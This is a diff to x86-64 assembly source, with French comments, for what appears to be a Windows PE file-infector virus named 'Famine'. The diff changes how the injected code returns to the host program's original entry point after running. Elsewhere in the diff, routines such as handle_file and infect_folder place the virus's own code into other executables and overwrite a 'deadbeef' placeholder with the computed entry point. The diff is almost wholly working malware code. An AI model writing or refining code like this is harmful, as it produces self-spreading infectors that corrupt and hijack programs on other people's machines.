@@ -34,6 +34,16 @@ main proc
 		push rbp
 		mov rbp, rsp
 
+		cmp BYTE ptr [MUST_EXIT], 1
+		je apres
+
+		pop rbp
+		call get_rip
+		sub rax, 13h
+		sub rax, qword ptr [ENTRY_POINT]
+		jmp rax
+
+		apres:
 		push RAX
 		push RBX
 		push RCX
@@ -90,7 +100,10 @@ main proc
 		test BYTE ptr [MUST_EXIT], 1
 		jne stop
 
-		call qword ptr [ENTRY_POINT]
+		pop rbp
+		mov rax, debut_main
+		sub rax, qword ptr [ENTRY_POINT]
+		jmp rax
 
 stop:
 		xor rax, rax
@@ -99,6 +112,7 @@ stop:
 		ret
 main endp
 fin_main:
+
 
 MUST_EXIT db 1
 ENTRY_POINT byte 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
@@ -118,6 +132,7 @@ SECTION_NAME db '.FAMINE',0
 ; 00 - 32	: shadow
 ; rsp
 
+; r10d : VA de Famine dans le fichier distant
 ; r12 : handle
 ; r13 : fileSize
 ; r14 : taille de notre code
@@ -218,6 +233,8 @@ handle_file proc ; int handle
 	inc r8d
 	mov dword ptr [rsp + 56], r8d
 	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle
+	xor r10, r10
+	mov r10d, r8d
 
 	add rax, 4
 	mov rbx, r14
@@ -266,6 +283,8 @@ handle_file proc ; int handle
 	xor rbx, rbx
 	mov ebx, dword ptr [r15]
 	inc rcx
+	sub r10, rbx
+	mov rbx, r10
 	mov qword ptr [rcx], rbx ; On remplace deadbeef par l'entry point
 
 	mov rax, debut_main
@@ -519,8 +538,8 @@ ft_memcpy proc ; char *strncpy(char *dest, const char *src, size_t n);
 	debut_boucle_ft_memcpy:
 	cmp rax, r8
 	je	fin_boucle_memcpy
-	mov r10B, [rdx]
-	mov byte ptr [rcx], r10B
+	mov r11b, [rdx]
+	mov byte ptr [rcx], r11b
 	inc rcx
 	inc rdx
 	inc rax
@@ -532,6 +551,17 @@ ft_memcpy proc ; char *strncpy(char *dest, const char *src, size_t n);
 	ret
 ft_memcpy endp
 
+get_rip proc
+	push rbp
+	mov rbp, rsp
+
+	mov rax, [rsp + 8]
+	;bswap rax
+
+	mov rsp, rbp
+	pop rbp
+	ret
+get_rip endp
 
 proc_nt_create_file proc
 jmp [qword ptr infect_folder]
